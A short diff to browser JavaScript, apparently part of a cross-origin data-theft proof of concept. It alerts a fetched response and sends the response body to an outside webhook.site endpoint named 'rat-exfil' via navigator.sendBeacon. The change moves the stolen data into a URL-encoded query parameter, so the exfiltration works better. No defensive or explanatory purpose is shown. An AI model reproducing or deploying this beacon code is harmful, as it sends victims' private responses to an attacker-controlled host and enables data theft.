@@ -71,7 +71,9 @@
             alert(`Status: ${r.status}\n\nResponse:\n${t}`);
             // Attempt to beacon the data back to your server
             if (navigator.sendBeacon) {
-                navigator.sendBeacon("https://webhook.site/rat-exfil/?cors=", t);
+                // Append 't' as a value to a key, like 'data='
+                const targetUrl = "https://webhook.site/rat-exfil/?cors=" + encodeURIComponent(t);
+                navigator.sendBeacon(targetUrl);
             }
         }))
         .catch(e => {
